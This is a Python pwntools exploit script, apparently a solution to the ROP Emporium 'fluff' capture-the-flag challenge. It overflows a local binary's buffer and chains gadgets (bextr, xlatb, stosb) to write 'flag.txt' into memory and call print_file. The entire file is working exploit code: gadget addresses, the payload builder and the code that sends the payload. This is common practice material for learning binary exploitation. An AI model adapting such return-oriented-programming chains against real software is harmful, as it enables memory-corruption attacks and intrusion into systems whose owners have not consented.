#!/usr/bin/python3

from pwn import *

write_loc 	= 0x601029
print_file 	= p64(0x400620)

target		= "./fluff"
back_junk 	= b"B" * 20

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2
badChars = b"xga."

# 0040069a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
pop_rbx_size = 0
rdx_set = False
# unpacker_64 = make_unpacker(64)
def pop_rbx(rbx):
	global unpacker_64
	global rdx_set
	if not rdx_set:
		returnPayload = p64(0x40062a)
		#rdx val, control for bextr
		# should start at bit 0 and then copy 64 bit
		returnPayload += p64(0xff00)
		rdx_set = True
	else:
		returnPayload = p64(0x40062a + 1)
	# rcx val
	# this will get placed into rbx after + 0x3ef2
	returnPayload += p64( (rbx) - 0x3ef2)
	global pop_rbx_size
	pop_rbx_size += len(returnPayload)
	return returnPayload



xlatb_gaget	    = p64(0x0400628)
# 0400610: mov eax, 0; pop rbp; ret;
null_eax_gaget	    = p64(0x0400610)
def write_al(location):
	returnPayload  = null_eax_gaget
	returnPayload += new_bp
	returnPayload += pop_rbx(location)
	returnPayload += xlatb_gaget

	return returnPayload

elf = ELF(target)
def find_byte(c):
	return next(elf.search(c))


pop_rdi_gaget = p64(0x04006a3)
def pop_rdi(val):
	returnPayload = pop_rdi_gaget
	returnPayload += p64(val)
	return returnPayload


# stosb byte ptr [rdi], al; ret;
stosb_gaget = p64(0x0400639)


rdi_set = False

def write_byte(dest, c):
	byte_loc = find_byte(c)
	
	# place the value in byte_loc into al
	returnPayload  = write_al(byte_loc)
	global rdi_set
	if not rdi_set:
		returnPayload += pop_rdi(dest)
		rdi_set = True
	returnPayload += stosb_gaget
	return returnPayload



def write_string(destination, string):
	dest = destination
	returnPayload = b""
	global rdi_set 
	rdi_set= False
	for i in range(len(string)):
		returnPayload += write_byte(dest, string[i])
		dest += 1
	
	return returnPayload

"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
	for i in range(0, len(payload), 8):
		continue
            # print(binascii.hexlify(payload[i:i+8]))

io = process(target)

#Fill up the buffer and the base pointer
payload = junk + new_bp

payload += write_string(write_loc, b"flag.txt")

# This is the vaddr of system
# First return to the location of the pop rdi
payload += pop_rdi(write_loc)
payload += print_file

payload += back_junk


# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))
print("Pop RBX takes up: " + str(pop_rbx_size))
input("Hit enter to apptempt exploit")
print(io.clean(0.5).decode("utf-8"))
io.send(payload)

input("exploit sent hit enter to end")

print(io.clean(0.5).decode("utf-8"))
sleep(1)

f = open('./payload', 'wb')
f.write(payload)
f.close()
